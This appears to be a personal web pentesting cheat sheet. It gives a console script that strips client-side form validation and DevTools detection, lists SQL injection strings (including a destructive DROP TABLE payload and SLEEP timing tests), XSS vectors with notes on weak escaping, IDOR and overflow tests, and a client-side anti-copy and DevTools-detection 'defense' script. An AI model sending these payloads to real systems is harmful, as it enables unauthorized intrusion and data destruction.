  # Pentesting
  
  ## Attack
  
  ### Utils
  
  #### 1 Disable validation
  
  **for innerHTML***
  ```js
  (() => {
    // 1. Disable built-in validation
    HTMLInputElement.prototype.checkValidity = () => true;
    HTMLFormElement.prototype.checkValidity = () => true;
    HTMLTextAreaElement.prototype.checkValidity = () => true;
    HTMLSelectElement.prototype.checkValidity = () => true;
  
    HTMLInputElement.prototype.reportValidity = () => true;
    HTMLFormElement.prototype.reportValidity = () => true;
    HTMLTextAreaElement.prototype.reportValidity = () => true;
    HTMLSelectElement.prototype.reportValidity = () => true;
  
    HTMLInputElement.prototype.setCustomValidity = () => {};
    HTMLTextAreaElement.prototype.setCustomValidity = () => {};
    HTMLSelectElement.prototype.setCustomValidity = () => {};
  
    // 2. Remove attribute validation
    document.querySelectorAll("*").forEach(el => {
      ["required","minlength","maxlength","pattern",
       "min","max","step","disabled"].forEach(attr => {
        el.removeAttribute(attr);
      });
    });
  
    // 3. Set all inputs to type=text
    document.querySelectorAll("input").forEach(input => {
      try { input.type = "text"; } catch(e) {}
    });
  
    // 4. Remove ALL listeners by cloning nodes
    document.querySelectorAll("input, textarea, select, form").forEach(el => {
      el.oninput = el.onchange = el.onblur = el.onsubmit = null;
      const clone = el.cloneNode(true);
      el.replaceWith(clone);
    });
  
    // 5. Re-grab forms after cloning and unlock submission
    document.querySelectorAll("form").forEach(form => {
      form.noValidate = true;
      form.addEventListener("submit", e => e.stopPropagation(), true);
    });
  
    // 6. Disable copy/paste/context protection
    document.oncopy = document.onpaste = document.oncontextmenu = null;
    document.addEventListener("copy", e => e.stopImmediatePropagation(), true);
    document.addEventListener("paste", e => e.stopImmediatePropagation(), true);
    document.addEventListener("contextmenu", e => e.stopImmediatePropagation(), true);
  
    // 7. Fix DevTools detection
    Object.defineProperty(window, 'outerWidth', { get: () => window.innerWidth });
    Object.defineProperty(window, 'outerHeight', { get: () => window.innerHeight });
  
    // 8. Kill all intervals
    const maxId = setInterval(() => {}, 0);
    for (let i = 0; i <= maxId; i++) clearInterval(i);
  
    console.log("Client-side validation disabled \\^w^/");
  })();
  ```
  ### 2 Manual
  
  #### SQL Injection 
  
  ```
  ' OR SLEEP(5) --
  ' OR SLEEP(3) --
  ' OR SLEEP(10) --
  ' OR SLEEP(100000000000) --
  ' OR 1=1 --
  " OR "1"="1"
  admin'--
  admin' --
  '; DROP TABLE users;--
  '; DROP TABLE usuario;--
  ' UNION SELECT 1,2,3--
  ' UNION SELECT NULL, NULL --
  ' OR 'x'='x
  admin'/*
  ' AND 1=1 --
  ' AND 1=2 --
  1 OR 1=1--
  1 OR 1=1
  ```
  
  #### IDOR Insecure Direct Object Reference
  
  ```text
  name: normal_user
  user: 0@_normalUser_@0
  
  /api/user?id=1 => 2
  /api/data?id=2 => 3
  ```
  
  #### XSS (Cross-Site Scripting)
  
  ##### htmlspecialchars
  ```
  <script>alert(0);</script>
  <img src=x onerror=alert(0)>
  <svg onload=alert(0)>
  <body onload=alert(0)>
  <input autofocus onfocus=alert(0)>
  <a href="javascript:alert(0)">click</a>
  
  // ===========================================
  // WEAK - default, only escapes < > &
  // htmlspecialchars($input)
  // ===========================================
  
  " onmouseover="alert(1)
  ' onmouseover='alert(0)
  
  // ===========================================
  // WEAK - no charset specified
  // htmlspecialchars($input, ENT_QUOTES)
  // ===========================================
  
  +ADw-script+AD4-alert(1)+ADw-/script+AD4-
  
  // ===========================================
  // CORRECT - escapes ' " < > &
  // htmlspecialchars($input, ENT_QUOTES, 'UTF-8')
  // ===========================================
  ```
  
  ##### Link
  ```
  // ===========================================
  // <a href="<?= htmlspecialchars($url, ENT_QUOTES, 'UTF-8') ?>">click</a>
  // <a href="javascript:alert(1)">click</a>
  /*
  $url = $_GET['url'];
  if (!preg_match('/^https?:\/\//', $url)) {
      $url = '#';
  }
  <a href="<?= htmlspecialchars($url, ENT_QUOTES, 'UTF-8') ?>">click</a>
  */
  // ===========================================
  
  javascript:alert(1)
  ```
  
  #### CSS Injection
  
  ```
  <style>body{background:red!important}</style>
  ```
  
  #### Overflow DB
  ````
  spam => A
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
  ````
  #### brute force
  
  ```
  brute force ??????????????/
  ```
  
  ## Defense (===)
  
  ### 1 Cheat
  
  ```js
  (() => {
  
      /* Block right click */
      document.addEventListener("contextmenu", event => {
          event.preventDefault();
      });
  
      /* Block copy */
      document.addEventListener("copy", event => {
          event.preventDefault();
      });
  
      /* Block paste */
      document.addEventListener("paste", event => {
          event.preventDefault();
      });
  
      /* Block keys */
      document.addEventListener("keydown", event => {
  
          const key = (event.key || "").toLowerCase();
  
          // Ctrl + C
          if (event.ctrlKey && key === "c") {
              event.preventDefault();
          }
  
          // Ctrl + V
          if (event.ctrlKey && key === "v") {
              event.preventDefault();
          }
  
          // Ctrl + Shift + I
          if (event.ctrlKey && event.shiftKey && key === "i") {
              event.preventDefault();
          }
  
          // F12
          if (key === "f12") {
              event.preventDefault();
          }
  
          // Context Menu key
          if (key === "contextmenu") {
              event.preventDefault();
          }
  
          // Shift + F10
          if (event.shiftKey && key === "f10") {
              event.preventDefault();
          }
  
      });
  
      /* Silent DevTools detection */
      let devtoolsOpened = false;
  
      setInterval(() => {
  
          const widthDiff = window.outerWidth - window.innerWidth;
          const heightDiff = window.outerHeight - window.innerHeight;
  
          if ((widthDiff > 160 || heightDiff > 160) && !devtoolsOpened) {
  
              devtoolsOpened = true;
  
              console.clear();
  
              document.body.innerHTML = `
                  <div style="
                      display:flex;
                      justify-content:center;
                      align-items:center;
                      height:100vh;
                      font-family:sans-serif;
                      font-size:20px;
                  ">
                      Developer tools detected
                  </div>
              `;
  
          }
  
      }, 1000);
  
  })();
  ```
